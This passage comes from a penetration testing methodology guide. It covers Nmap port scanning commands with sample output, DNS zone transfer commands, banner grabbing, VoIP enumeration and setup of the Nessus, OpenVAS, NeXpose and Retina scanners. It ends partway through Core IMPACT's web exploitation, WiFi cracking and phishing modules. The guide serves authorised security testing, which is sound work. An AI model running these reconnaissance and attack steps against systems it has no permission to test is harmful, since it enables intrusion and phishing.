-sO: IP protocol scan -b : FTP bounce scan PORT SPECIFICATION AND SCAN ORDER: -p : Only scan specified ports Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 -F: Fast mode - Scan fewer ports than the default scan -r: Scan ports consecutively - don't randomize --top-ports : Scan most common ports --port-ratio : Scan ports more common than SERVICE/VERSION DETECTION: -sV: Probe open ports to determine service/version info --version-intensity : Set from 0 (light) to 9 (try all probes) --version-light: Limit to most likely probes (intensity 2) --version-all: Try every single probe (intensity 9) --version-trace: Show detailed version scan activity (for debugging) SCRIPT SCAN: -sC: equivalent to --script#default --script# : is a comma separated list of directories, script-files or script-categories --script-args# : provide arguments to scripts --script-trace: Show all data sent and received --script-updatedb: Update the script database. OS DETECTION: -O: Enable OS detection --osscan-limit: Limit OS detection to promising targets --osscan-guess: Guess OS more aggressively TIMING AND PERFORMANCE: Options which take are in seconds, or append 'ms' (milliseconds), 's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m). -T < 0-5>: Set timing template (higher is faster) --min-hostgroup/max-hostgroup : Parallel host scan group sizes --min-parallelism/max-parallelism : Probe parallelization --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout : Specifies probe round trip time. --max-retries : Caps number of port scan probe retransmissions. --host-timeout : Give up on target after this long --scan-delay/--max-scan-delay : Adjust delay between probes --min-rate : Send packets no slower than per second --max-rate : Send packets no faster than per second FIREWALL/IDS EVASION AND SPOOFING: -f; --mtu : fragment packets (optionally w/given MTU) -D : Cloak a scan with decoys -S : Spoof source address -e : Use specified interface -g/--source-port : Use given port number --data-length : Append random data to sent packets --ip-options : Send packets with specified ip options --ttl : Set IP time-to-live field --spoof-mac : Spoof your MAC address --badsum: Send packets with a bogus TCP/UDP/SCTP checksum OUTPUT: -oN/-oX/-oS/-oG : Output scan in normal, XML, s| : Output in the three major formats at once -v: Increase verbosity level (use -vv or more for greater effect) -d: Increase debugging level (use -dd or more for greater effect) --reason: Display the reason a port is in a particular state --open: Only show open (or possibly open) ports --packet-trace: Show all packets sent and received --iflist: Print host interfaces and routes (for debugging) --log-errors: Log errors/warnings to the normal-format output file --append-output: Append to rather than clobber specified output files --resume : Resume an aborted scan --stylesheet : XSL stylesheet to transform XML output to HTML --webxml: Reference stylesheet from Nmap.Org for more portable XML --no-stylesheet: Prevent associating of XSL stylesheet w/XML output MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute --datadir : Specify custom Nmap data file location --send-eth/--send-ip: Send using raw ethernet frames or IP packets --privileged: Assume that the user is fully privileged --unprivileged: Assume the user lacks raw socket privileges -V: Print version number -h: Print this help summary page. EXAMPLES: nmap -v -A scanme.nmap.org nmap -v -sn 192.168.0.0/16 10.0.0.0/8 nmap -v -iR 10000 -Pn -p 80 SEE THE MAN PAGE (http://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES Nmap has dozens of options available. Since this section is dealing with port scanning, we will focus on the commands required to perform this task. It is important to note that the commands utilized depend mainly on the time and number of hosts being scanned. The more hosts or less time that you have to perform this tasks, the less that we will interrogate the host. This will become evident as we continue to discuss the options. Based on IP set being assessed, you would want to scan the both TCP and UDP across port range to 1-65535. The command that will be utilized is as follows: nmap -A -PN -sU -sS -T2 -v -p 1-65535 < client ip range > / < CIDR > or < Mask > -oA NMap_FULL_ < client ip range > nmap -A -PN -sU -sS -T2 -v -p 1-65535 client.com -oA NMap_FULL_client Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:27 Eastern Daylight Time NSE: Loaded 57 scripts for scanning. Initiating Parallel DNS resolution of 1 host. at 22:27 Completed Parallel DNS resolution of 1 host. at 22:27, 0.10s elapsed Initiating SYN Stealth Scan at 22:27 Scanning client.com (74.117.116.73) [65535 ports] Discovered open port 80/tcp on 74.117.116.73 On large IP sets, those greater than 100 IP addresses do not specify a port range. The command that will be utilized is as follows: nmap -A -O -PN < client ip range > / < CIDR > or < Mask > -oA NMap_ < client ip range > nmap -A -O -PN client.com -oA NMap_client Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:37 Eastern Daylight Time Nmap scan report for client.com (74.117.116.73) Host is up (0.13s latency). rDNS record for 74.117.116.73: 74-117-116-73.parked.com Not shown: 999 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.2.3 ((CentOS)) | http-robots.txt: 2 disallowed entries |_/click.php /ud.php |_http-title: client.com |_http-methods: No Allow or Public header in OPTIONS response (status code 200) |_http-favicon: Parked.com domain parking Warning: OSScan results may be unreliable because we could not find at least 1 o pen and 1 closed port Device type: general purpose Running (JUST GUESSING): Linux 2.6.X (92%), OpenBSD 4.X (88%), FreeBSD 6.X (88%) It should be noted that Nmap has limited options for IPv6. These include TCP connect (-sT), Ping scan (-sn), List scan (-sL) and version detection. nmap -6 -sT -P0 fe80::80a5:26f2:8db7:5d04%12 Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:42 Eastern Daylight Time Nmap scan report for lancelot (fe80::80a5:26f2:8db7:5d04) Host is up (1.0s latency). Not shown: 988 closed ports PORT STATE SERVICE 135/tcp open msrpc 445/tcp open microsoft-ds 554/tcp open rtsp 2869/tcp open icslap 3389/tcp open ms-term-serv 5000/tcp open upnp 5001/tcp open commplex-link 5002/tcp open rfe 5003/tcp open filemaker 5004/tcp open avt-profile-1 5357/tcp open wsdapi 10243/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 287.05 seconds SNMP Sweeps SNMP sweeps are performed too as they offer tons of information about a specific system. The SNMP protocol is a stateless, datagram oriented protocol. Unfortunately SNMP servers don't respond to requests with invalid community strings and the underlying UDP protocol does not reliably report closed UDP ports. This means that \"no response\" from a probed IP address can mean either of the following: Machine unreachable SNMP server not running invalid community string the response datagram has not yet arrived SNMPEnum (Linux) SNMPEnum is a perl script that sends SNMP requests to a single host, then waits for the response to come back and logs them. [[:File:Penetration_Testing_Execution_45.png|Screenshot Here]] Metasploit Active footprinting can also be performed to a certain extent through Metasploit. Please refer to the [ http://www.offensive-security.com/metasploit-unleashed/Information_Gathering Metasploit Unleashed] course for more information on this subject. Zone Transfers DNS zone transfer, also known as AXFR, is a type of DNS transaction. It is a mechanism designed to replicate the databases containing the DNS data across a set of DNS servers. Zone transfer comes in two flavors, full (AXFR) and incremental (IXFR). There are numerous tools available to test the ability to perform a DNS zone transfer. Tools commonly used to perform zone transfers are host, dig and nmap. Host host < domain > < DNS server > Dig dig @server domain axfr SMTP Bounce Back SMTP bounce back, also called a Non-Delivery Report/Receipt (NDR), a (failed) Delivery Status Notification (DSN) message, a Non-Delivery Notification (NDN) or simply a bounce, is an automated electronic mail message from a mail system informing the sender of another message about a delivery problem. This can be used to assist an attacker in fingerprint the SMTP server as SMTP server information, including software and versions, may be included in a bounce message. Reverse DNS Reverse DNS can be used to obtain valid server names in use within an organizational. There is a caveat that it must have a PTR (reverse) DNS record for it to resolve a name from a provided IP address. If it does resolve then the results are returned. This is usually performed by testing the server with various IP addresses to see if it returns any results. Banner Grabbing Banner Grabbing is an enumeration technique used to glean information about computer systems on a network and the services running its open ports. Banner grabbing is used to identify network the version of applications and operating system that the target host are running. Banner grabbing is usually performed on Hyper Text Transfer Protocol (HTTP), File Transfer Protocol (FTP), and Simple Mail Transfer Protocol (SMTP); ports 80, 21, and 25 respectively. Tools commonly used to perform banner grabbing are Telnet, nmap, netcat and netca6 (IPv6). HTTP JUNK / HTTP/1.0 HEAD / HTTP/9.3 OPTIONS / HTTP/1.0 HEAD / HTTP/1.0 httprint httprint is a web server fingerprinting tool. It relies on web server characteristics to accurately identify web servers, despite the fact that they may have been obfuscated by changing the server banner strings, or by plug-ins such as mod_security or servermask. httprint can also be used to detect web enabled devices which do not have a server banner string, such as wireless access points, routers, switches, cable modems, etc. httprint uses text signature strings and it is very easy to add signatures to the signature database. [[:File:Penetration_Testing_Execution_46.png|Screenshot Here]] VoIP mapping VoIP mapping is where we gather information about the topology, the servers and the clients. The main goal here is to find live hosts, PBX type and version, VoIP servers/gateways, clients (hardware and software) types and versions. The majority of techniques covered here assume a basic understanding of the ''Session Initiation Protocol (SIP''). There are several tools available to help us identify and enumerate VoIP enabled devices. SMAP is a tool which is specifically designed to scan for SIP enabled devices by generating SIP requests and awaiting responses. SMAP usage is as follows: [[:File:Penetration_Testing_Execution_47.png|Screenshot Here]] SIPScan is another scanner for sip enabled devices that can scan a single host or an entire subnet. [[:File:Penetration_Testing_Execution_48.png|Screenshot Here]] Extensions Extensions are any client application or device that initiates a SIP connection, such as an IP phone, PC softphone, PC instant messaging client, or mobile device. The goal is to identify valid usernames or extensions of SIP devices. Enumerating extensions is usually a product of the error messages returned using the SIP method: REGISTER, OPTIONS, or INVITE. There are many tools that can be utilized to enumerate SIP devices. A tool that can be used to enumerate extensions is Svwar from the SIPVicious suite. Svwar Svwar is also a tool from the sipvicious suite allows to enumerate extensions by using a range of extensions or using a dictionary file svwar supports all the of the three extension enumeration methods as mentioned above, the default method for enumeration is REGISTER. Svwar usage is as follows: [[:File:Penetration_Testing_Execution_49.png|Screenshot Here]] enumIAX If you ' ve identified an Asterisk server is in use, you need to utilize a username guessing tool such as enumIAX to enumerate Asterisk Exchange protocol usernames. enumIAX is an Inter Asterisk Exchange version 2 (IAX2) protocol username brute-force enumerator. enumIAX may operate in two distinct modes; Sequential Username Guessing or Dictionary Attack. enumIAX usage is as follows: [[:File:Penetration_Testing_Execution_50.png|Screenshot Here]] Passive Reconnaissance Packet Sniffing Performing packet sniffing allows for the collection IP addresses and MAC addresses from systems that have packet traffic in the stream being analyzed. For the most part, packet sniffing is difficult to detect and so this form of recon is essentially passive and quite stealthy. By collecting and analyzing a large number of packets it becomes possible to fingerprint the operating system and the services that are running on a given device. It may also be possible to grab login information, password hashes, and other credentials from the packet stream. Telnet and older versions of SNMP pass credentials in plain text and are easily compromised with sniffing. Packet sniffing can also be useful in determining which servers act as critical infrastructure and therefore are of interest to an attacker. Vulnerability Analysis Vulnerability Analysis is used to identify and evaluate the security risks posed by identified vulnerabilities. Vulnerability analysis work is divided into two areas: Identification and validation. Vulnerability discovery effort is the key component of the Identification phase. Validation is reducing the number of identified vulnerabilities to only those that are actually valid. Vulnerability Testing Vulnerability Testing is divided to include both an Active and Passive method. Active Automated Tools An automated scanner is designed to assess networks, hosts, and associated applications. There are a number of types of automated scanners available today, some focus on particular targets or types of targets. The core purpose of an automated scanner is the enumeration of vulnerabilities present on networks, hosts, and associated applications. Network/General Vulnerability Scanners Open Vulnerability Assessment System (OpenVAS) (Linux) The Open Vulnerability Assessment System (OpenVAS) is a framework of several services and tools offering a comprehensive and powerful vulnerability scanning and vulnerability management solution. OpenVAS is a fork of Nessus that allows free development of a non-proprietary tool. Like the earlier versions of Nessus, OpenVAS consists of a Client and Scanner. To start the Scanner, simply run openvassd from the command line. [[:File:Penetration_Testing_Execution_51.png|Screenshot Here]] There are two ways in which you can run the OpenVAS Client, either the GUI or the command line interface. Using the menu you would select on OpenVAS Client. In the console it is \"OpenVAS-Client.\" [[:File:Penetration_Testing_Execution_52.png|Screenshot Here]] Once the client starts up you will need to connect it to the scanner. [[:File:Penetration_Testing_Execution_53.png|Screenshot Here]] Submit in the supplied user credentials. [[:File:Penetration_Testing_Execution_54.png|Screenshot Here]] If you created a certificate then you supply it as well. You will then be presented with a certificate to accept. Click yes to continue. [[:File:Penetration_Testing_Execution_55.png|Screenshot Here]] Once you accept the certificate, OpenVAS will initialize and indicate the number of Found and Enabled plugins. This could take a while depending upon the number of plugins that need to be downloaded. Also, you need to ensure that you've added the appropriate /etc/hosts entries for both the IPv4 and IPv6 address. For example: 127.0.0.1 localhost 127.0.0.1 pentest # The following lines are desirable for IPv6 capable hosts : :1 ip6-localhost ip6-loopback pentest localhost [[:File:Penetration_Testing_Execution_56.png|Screenshot Here]] Before scanning anything we need to configure the OpenVAS Scan Options. The General section covers all the general scan options. See Appendix A for the specific settings. To start a new scan, you use the Scan Assistant. [[:File:Penetration_Testing_Execution_57.png|Screenshot Here]] Once the Scan Assistant launches, you'll have to provide some information to create the task. First, you'll need to give the name of the task. This is usually the name of the client or some other name that describes what you're scanning. Once you've completed this, click Forward to continue. [[:File:Penetration_Testing_Execution_58.png|Screenshot Here]] A scope can be seen as a sub-task. It defines a certain scan and the title should indicate the scope of the scan such as \"Internet Facing Systems\" or \"Aggressive Scan of Client X\". Once you've completed this, click Forward to continue. [[:File:Penetration_Testing_Execution_59.png|Screenshot Here]] At this point you'll need to provide the target information. This can be in the form of a hostname, FQDN, IP Address, Network Range, CIDR. The only requirement is that they have to be separated with commas. Once you've completed this, click Forward to continue. [[:File:Penetration_Testing_Execution_60.png|Screenshot Here]] Finally, we're at the point where we can launch our scan. Click Execute to start the scan. [[:File:Penetration_Testing_Execution_61.png|Screenshot Here]] [[:File:Penetration_Testing_Execution_62.png|Screenshot Here]] [[:File:Penetration_Testing_Execution_63.png|Screenshot Here]] [[:File:Penetration_Testing_Execution_64.png|Screenshot Here]] Nessus (Windows/Linux) Nessus is a commercial automated scanning program. It is designed to detect potential vulnerabilities on the networks, hosts, and associated application being assessed. Nessus allows for custom policies to be utilized for specific evaluations. For non-Web applications, the policy that should be utilized is the \"Only Safe Checks\" policy (See Appendix A). For Web applications, the policy that should be utilized is the \"Only Safe Checks (Web)\" policy (See Appendix B). To access Nessus simply enter in the correct URL into a web browser. If you are accessing from the Pentest Lab use the following URL: https:// < IP ADDRESS > :8834. ''' [[:File:Penetration_Testing_Execution_65.png|Screenshot Here]] ''' The credentials to access this will need to be established prior to attempting to access. Once you have the logged in, you will be presented with the Reports Interface. Prior to running any Nessus scan, the product should be validated to ensure that it has been properly updated with the latest signatures. This process is normally run as part of a scheduled task, but you can run click on \"About\" which will present the Windows which contains data about the installation. [[:File:Penetration_Testing_Execution_66.png|Screenshot Here]] The Client Build ID is quick way to ensure that Nessus has been updated. The format is as simple as YYYYMMDD. 201110223 would mean that the scanner was last updated on February, 23, 2011. [[:File:Penetration_Testing_Execution_67.png|Screenshot Here]] If the scanner has been updated within the last week, you can safely conduct scans. If this date is further out than one week, you should immediately report this and avoid using the scanner until Nessus has been updated. Within Nessus, there are four main tabs available: Reports, Scans, Policies, and Users. ''' [[:File:Penetration_Testing_Execution_68.png|Screenshot Here]] ''' To initiate a scan utilize the Scan tab. This will present you with several additional options such as Add, Edit, Browse, Launch, Pause, Stop, and Delete. [[:File:Penetration_Testing_Execution_69.png|Screenshot Here]] You will create a new scan by clicking on the \"Scans\" option on the menu bar at the top and then click on the \" + Add\" button on the right. The \"Add Scan\" screen will be displayed as follows: ''' [[:File:Penetration_Testing_Execution_70.png|Screenshot Here]] ''' There are five fields to enter before starting a scan. The name field is set to the name that will be displayed to identify the scan. The type field allows you to choose between \"Run Now\" and \"Template.\" \"Run Now\" executes the scan immediately after submitting. \"Template\" saves the scan as a template for repeated scans. The policy field is where the scan policy is selected. The final two fields are both related to the scan targets. You can either enter in the hosts (one per line) or browse for a text file containing all the target hosts. Once all these fields have been properly populated click \"Launch Scan\" to initiate the scan process. ''Note:'' Automated tools can sometimes be too aggressive by default and need to be scaled back if the customer is affected. A validation scan should be conducted weekly against < IP ADDRESS > using the \"Validation Scan\" policy (See Appendix C) to ensure that Nessus is performing scans in properly. [[:File:Penetration_Testing_Execution_71.png|Screenshot Here]] If you conduct a \"Validation Scan\" and do not receive similar results, then you should immediately report this and void using the scanner. Once the scan has completed running, it will be visible in the Reports tab. To open the scan reports simply double-click on the appropriate completed scan file. This will provide us with some information about the scan as well as the results. ''' [[:File:Penetration_Testing_Execution_72.png|Screenshot Here]] ''' We need to save this report for us to analyze. To do this, click on the \"Download Report.\" This will present a new window that allows for the format to be specified. ''' [[:File:Penetration_Testing_Execution_73.png|Screenshot Here]] ''' The default format is \".nessus\", however it is necessary to download the Nessus results in HTML format. This allows you to quickly review the vulnerabilities. NeXpose Nessus is a commercial automated scanning product that provides vulnerability management, policy compliance and remediation management. It is designed to detect vulnerabilities as well as policy compliance on the networks, hosts, and associated web applications. To access NeXpose simply enter in the correct URL into a web browser. If you are accessing from the Pentest Lab use the following URL: https:// < IP ADDRESS > :3780/login.html. [[:File:Penetration_Testing_Execution_74.png|Screenshot Here]] The credentials to access this will need to be established prior to attempting to access. Once you have the logged in, you will be presented with the dashboard Interface. [[:File:Penetration_Testing_Execution_75.png|Screenshot Here]] Prior to running any NeXpose scan, the product should be validated to ensure that it has been properly updated with the latest signatures. This process is normally run as part of a scheduled task, but you can quickly validate that it the scanner is up to date by simply viewing the 'News' which will give you a log file of all the updates to the scan engine as well as any updated checks. [[:File:Penetration_Testing_Execution_76.png|Screenshot Here]] If the scanner has been updated within the last week, you can safely conduct scans. If this date is further out than one week, you should immediately report this and void using the scanner until NeXpose has been updated. Within NeXpose, there are six main tabs available: Home, Assets, Tickets, Reports, Vulnerabilities, and Administration. ''' [[:File:Penetration_Testing_Execution_77.png|Screenshot Here]] ''' To initiate a scan you will have to setup a 'New Site'. To perform this click on the 'New Site' button at the bottom of the Home Page or click on the Assets tab. [[:File:Penetration_Testing_Execution_78.png|Screenshot Here]] This will present you with the 'Site Configuration - General' page which contains several inputs such as Site name, Site importance, and Site Description. [[:File:Penetration_Testing_Execution_79.png|Screenshot Here]] Type a name for the target site. Then add a brief description for the site, and select a level of importance from the dropdown list. The importance level corresponds to a risk factor that NeXpose uses to calculate a risk index for each site. The 'Very Low' setting reduces a risk index to \u2153 of its initial value. The 'Low' setting reduces the risk index to \u2154 of its initial value. 'High' and 'Very High' settings increase the risk index to 2x and 3x times its initial value, respectively. A 'Normal' setting does not change the risk index. ''' [[:File:Penetration_Testing_Execution_80.png|Screenshot Here]] ''' Go to the ''Devices ''page to list assets for your new site. IP addresses and/or hostnames can be manually entered in the text box labeled ''Dev''i''ces to scan''. It is also possible to import a comma separated file that lists IP address and/or the host names of targets you want to scan. You do have to ensure that each address/hostname in the file appears on its own line. To import a target list file, click the Browse''' '''button in the '''Included Device's' ''area, and select the appropriate file. If you need to exclude targets from a scan, the process is the sample however; it is performed under the area labeled '''Devices to Exclude'.'' Once the targets have been added, a scan template will need to be selected from the '''Scan Setup' ''page. To select a scan template simply browse the available templates. The scan engine drop down allows you to choose between the local scan engine and the Rapid 7 hosted scan engine. [[:File:Penetration_Testing_Execution_81.png|Screenshot Here]] There are many templates available, however be aware that if you modify a template, all sites that use that scan template will use these modified settings. So ensure that modify an existing template with caution. The default scan templates Denial of Service, Discovery scan, Discovery scan (aggressive), Exhaustive, Full audit, Internal DMZ audit, Linux RPMs, Microsoft hotfix, Payment Card Industry (PCI) audit, Penetration test, Safe network audit, Sarbanes-Oxley (SOX) compliance, SCADA audit, and Web audit. Specific settings for these templates are included in Appendix D Finally, if you wish to schedule a scan to run automatically, click the check box labeled 'Enable schedule'. The console displays options for a start date and time, maximum scan duration in minutes, and frequency of repetition. If the scheduled scan runs and exceeds the maximum specified duration, it will pause for an interval that you specify in the option labeled 'Repeat every'. Select an option for what you want the scan to do after the pause interval. The newly scheduled scan will appear in the 'Next Scan' column of the 'Site Summary' pane of the page for the site that you are creating. All scheduled scans appear on the 'Calendar' page, which you can view by clicking the 'Monthly calendar' link on the 'Administration' page. You can set up alerts to inform you when a scan starts, stops, fails, or matches a specific criterion. From the '''Alerting; ''page and click the ''''New Alert' '''button. [[:File:Penetration_Testing_Execution_82.png|Screenshot Here]] The console displays a '''New Alert' ''dialog box. Click the ''''Enable alert' '''check box to ensure that NeXpose generates this type of alert. You can click the box again at any time to disable the alert if you prefer not to receive that alert temporarily without having to delete it. [[:File:Penetration_Testing_Execution_83.png|Screenshot Here]] Type a name for the alert and a value in the 'Send at most' field if you wish to limit the number of this type of alert that you receive during the scan. Select the check boxes for types of events (Started, Stopped, Failed, Paused, and Resumed) that you wish to generate alerts for. Select the Confirmed, Unconfirmed, and/or Potential check boxes to receive only those alerts. Select a notification method from the dropdown box. NeXpose can send alerts via SMTP e-mail, SNMP message, or Syslog message. Select e-mail method and enter the addresses of your intended recipients. Click the Limit alert text check box to send the alert without a description of the alert or its solution. Click the Save button. The new alert appears on the 'Alerting' page. [[:File:Penetration_Testing_Execution_84.png|Screenshot Here]] Establishing logon credentials enables deeper checks across a wider range of vulnerabilities, such as policy violations, adware, or spyware. Additionally, credentialed scans result in more accurate results. On the 'Credentials' page click 'New Login' display the 'New Login' box. [[:File:Penetration_Testing_Execution_85.png|Screenshot Here]] Select the desired type of credentials from the dropdown list labeled 'Login type'. This selection determines the other fields that appear in the form. In the appropriate field enter the appropriate user name and/or password. The 'Restrict to Device' and 'Restrict to Port' fields allows for testing credentials to ensure that the work on a given site. After filling those fields, click on the 'Test login' button to make sure that the credentials work. Specifying a port in the Restrict to Port field allows you to limit your range of scanned ports in certain situations. Click the 'Save' button. The new credentials appear on the 'Credentials' page. Once the scan has completed, you can view the results in several manners. It is possible to view the assets by sites, view assets by groups, view assets by operating systems, view assets by services, view assets by software, and view all assets. [[:File:Penetration_Testing_Execution_86.png|Screenshot Here]] By selecting the appropriate assets view you can select the results that you wish to view. [[:File:Penetration_Testing_Execution_87.png|Screenshot Here]] To create a report, click on the 'Create Site Report' button. This will take you to the 'New Report' 'Configuration' page. [[:File:Penetration_Testing_Execution_88.png|Screenshot Here]] Report configuration entails selecting a report template, assets to report on, and distribution options. You may schedule automatic reports for generation and distribution after scans or on a fixed calendar timetable; or you may run reports manually. After you go through all the following configuration steps and click 'Save', NeXpose will immediately start generating a report. eEYE Retina eEye Retina Vulnerability Assessment Scanner is a vulnerability scanner created by eEye Digital Security that is used to correlate and validate findings from Nmap and Nessus. At first glance, the interface looks to be much more complicated than Nessus. It is however, extremely simple once you've explored it. The initial screen that is presented is the Discovery Tasks page. This is utilized to perform a discovery scan to determine what hosts are alive. ''' [[:File:Penetration_Testing_Execution_89.png|Screenshot Here]] ''' To perform a Discovery Scan, click Targets from the Actions section and the \"Select Targets\" option will appear. At this point you can either enter in a single IP address or hostname that you assess. The other options available are to scan by IP Range, CIDR, Named Host, and Address Groups. Clicking on the Options Actions section presents us with additional options related to the Discovery scan. These options include ICMP Discovery, TCP Discovery on Ports (enter in a comma separated list of port numbers, UPD Discovery, Perform OS Detection, Get Reverse DNS, Get NetBIOS Name, and Get MAC Address. Select the appropriate options for the scan desired. ''' [[:File:Penetration_Testing_Execution_90.png|Screenshot Here]] ''' To run the Discovery scan immediately click \"Discover.\" To run the Discovery scan at a later point in time or on a regular schedule, click \"Schedule.\" Retina displays your results in the Results table as it scans the selected IP(s). In order to get the results in a format that we can use, we need to select the scan results and click \"Generate\" to export the results in XML format. ''' [[:File:Penetration_Testing_Execution_91.png|Screenshot Here]] ''' While Discovery Scans may be useful, the majority of our tasks will take place in the Audit Interface. This is very similar to the Discovery Scan interface; however it does have a few more options. ''' [[:File:Penetration_Testing_Execution_92.png|Screenshot Here]] ''' The Targets section is similar though there is an additional section that allows us to specify the Output Type, Name, and Job Name. ''' [[:File:Penetration_Testing_Execution_93.png|Screenshot Here]] ''' This section is important to complete, as this is how the scan results will be saved. If you do not change this information then you could potentially overwrite someone else's scan results. By default, these are saved to the following directory: C:\\Program Files\\eEye Digital Security\\Retina 5\\Scans This is important to note, as you will need to copy these from this location to your working directory. At this point we need to click Ports from the Actions section and the \"Select Port Group(s)\" option will appear. At this point we need to validate that the \"All Ports\" option has been selected. ''' [[:File:Penetration_Testing_Execution_94.png|Screenshot Here]] ''' The next section we need to check is \"Audits\" from the Actions section and the \"Select Audit Group(s)\" option will appear. At this point we need to validate that the \"All Audits\" option has been selected. ''' [[:File:Penetration_Testing_Execution_95.png|Screenshot Here]] ''' The final section we need to check is \"Options\" from the actions section. Clicking on this will present us with the \"Select Options\" action section. ''' [[:File:Penetration_Testing_Execution_96.png|Screenshot Here]] ''' At this point we need to validate that the following option has been selected: Perform OS Detection Get Reverse DNS Get NetBIOS Name Get MAC Address Perform Traceroute Enable Connect Scan Enable Force Scan Randomize Target List Enumerate Registry via NetBIOS Enumerate Users via NetBIOS Enumerate Shares via NetBIOS Enumerate Files via NetBIOS Enumerate Hotfixes via NetBIOS. Enumerate Named Pipes via NetBIOS Enumerate Machine Information via NetBIOS Enumerate Audit Policy via NetBIOS Enumerate Per-User Registry Settings via NetBIOS Enumerate Groups via NetBIOS Enumerate Processes via NetBIOS Enumerate a maximum of 100 users At this point we are ready to actually perform the Audit Scan. Click the Scan button to start the Audit Scan immediately. To perform the scan at a later point in time or on a regular schedule, click \"Schedule.\" ''' [[:File:Penetration_Testing_Execution_97.png|Screenshot Here]] ''' ''Note:'' Automated tools can sometimes be too aggressive by default and need to be scaled back if the customer is affected. The results of your scan are automatically saved in .rtd format. Retina displays your results in the Results table as it scans the selected IP(s). ''' [[:File:Penetration_Testing_Execution_98.png|Screenshot Here]] ''' Qualys < Contribution Needed > Core IMPACT Core IMPACT is a penetration testing and exploitation toolset used for testing the effectiveness of your information security program. Core IMPACT automates several difficult exploits and has a multitude of exploits and post exploitation capabilities. Core IMPACT Web Core can exploit SQL injection, Remote File Inclusion and Reflected Cross Site Scripting flaws on vulnerable web applications. ''' [[:File:coreWEBrpt.jpg|Screenshot Here]] ''' 1) Information Gathering. As always, the first step information gathering. Core organizes web attacks into scenarios. You can create multiple scenarios and test the same application with varying settings, segment a web application, or to separate multiple applications. a) Select the target, either by providing a url or telling Core to choose web servers discovered during the network RPT b) Choose a method for exploring the site, automatic or interactive. With automatic crawling, select the browser agent, max pages and depth, whether it should follow links to other/or to include other domains, whether it should run test to determine the server/application framework, whether to evaluate javascript, check robots.txt for links, and how it should handle forms. For greater customization, you can also select a link parsing module and set session parameters. ''' [[:File:coreWEBcrawl.jpg|Screenshot Here]] ''' With interactive, you set your \u00eebrowser\u00ee to use Core as a proxy and then navigate through the web application. Further customized discovery modules like checking for backup and hidden pages are available on the modules tab. ''' [[:File:corerptmodules.jpg|Screenshot Here]] ''' 2) Web Attack and penetration. The attack can be directed to a scenario or individual pages. Each type of exploit has its own configuration wizard. SQL Injection tests can be performed on request parameters and/or request cookies. There are three different levels of injection attacks FAST: quickly runs the most common tests, NORMAL: runs the tests that are in the FAST plus some additional tests FULL: runs all tests (for details on what the difference tests check for, select the modules tab, navigate to the Exploits | SQL Injection section and view the contents of the SQL Injection Analyzer paying attention to the fuzz_strings). Adding information about known custom error pages and any session arguments will enhance testing. For XSS attacks, configure the browser XSS should be tested for, whether or not to evaluate POST parameters and whether to look for Persistent XSS vulnerabilities. For PHP remote file injection vulnerabilities, the configuration is either yes try to exploit or no, don\u00edt. Monitor the module progress in the Executed Modules pane. If the WebApps Attack and Penetration is successful, then Core Agents (see note on agents in Core network RPT) will appear under vulnerable pages in the Entity View. 3) Web Apps Browser attack. Can leverage XSS exploits to assist with Social Engineering awareness tests. The wizard will guide the penetration tester though the process of leveraging the XSS vulnerability to your list of recipients from the client side information gathering phase. 4) Web App Local Information Gathering. Will check for sensitive information, get database logins and get the database schema for pages where SQL was successfully exploited. Command and SQL shells may also be possible. ''' [[:File:coreWEBagendeployed.jpg|Screenshot Here]] ''' The RFI agent(PHP) can be used to gather information, for shell access, or to install the full Core Agent. 5) Report Generation. Select from a variety of reports like executive, vulnerability and activity reports. Core Onestep Web RPTs Core also has two one-step rapid penetration tests 1) WebApps Vulnerability Test Type in the web application and Core will attempt to locate pages that contain vulnerabilities to SQL Injection, PHP Remote File Inclusion, or Cross-site Scripting attacks. This test can also be scheduled. 2) WebApps Vulnerability Scanner Validator Core will try to confirm vulnerabilities from IBM Rational AppScan, HP WebInspect, or NTOspider scans. Core IMPACT WiFi Core Impact contains a number of modules for penetration testing an 802.11 wireless network and/or the security of wireless clients. In order to use the wireless modules you must use an AirPcap adapter available from www.cacetech.com . ''' [[:File:corewireless.jpg|Screenshot Here]] ''' 1) Information Gathering. Select the channels to scan to discover access points or capture wireless packets. 2) Wireless Denial of Service The station deauth module can be used to demonstrate wireless network disruption. It is also used to gather information for encryption key cracking. 3) Crack Encryption Keys. Attempt to discover and crack WEP and WPA/WPA2 PSK encryption keys. For WPA/WPA2, relevant passwords files from recognizance phase should be used. 4) Man in the Middle client attacks. Allows penetration tester to sniff wireless traffic, intercept or manipulate requests to gain access to sensitive data or an end user system. Leverage existing wireless network from steps one and two, or setup fake access points with the Karma Attack. 5) Reporting. Reports about all the discovered WiFi networks , summary information about attacks while using a Fake Access Point and results of Man In The Middle (MiTM) attacks can be generated. Core IMPACT Client Side Core Impact can perform controlled and targeted social engineering attacks against a specified user community via email, web browsers, third-party plug-ins, and other client-side applications. ''' [[:File:coreCSrpt.jpg|Screenshot Here]] ''' 1) As always, the first step information gathering. Core Impact has automate modules for scraping email addresses our of search engines (can utilize search API keys), PGP, DNS and WHOIS records, LinkedIn as well as by crawling a website, contents and metadata for Microsoft Office Documents and PDFs , or importing from a text file generated using source as documented in the intelligence gather section of the PTES. 2) With the target list complete, the next step is to create the attack. Core supports multiple types of attacks, including single exploit, multiple exploits or a phishing only attack ''' [[:File:coreCSattacktype.jpg|Screenshot Here]] ''' ''' [[:File:coreCSsingle.jpg|Screenshot Here]] ''' ''' [[:File:coreCSmulti.jpg|Screenshot Here]] ''' ''' [[:File:coreCSphish.jpg|Screenshot Here]] ''' Depending on which option is chosen the wizard will walk you through choosing the exploit, setting the duration of the client side test, and choosing an email template (note: predefined templates are available, but message should be customized to match target environment!) .Web links can be obfuscated using tinyURL, Bit.Ly or Is.gd. After setting the options for the email server the Core Agent connect back method (HTTP, HTTPS, or other port), and choosing whether or not to run a module on successful exploitation or to try to collect smb credentials, the attack will start. Specific modules can be run instead of using the wizard by choosing the modules tab ''' [[:File:corerptormodules.jpg|Screenshot Here]] ''' Monitor the Executed Modules pane to see the progress of the client side attack. As agents are deployed, they will 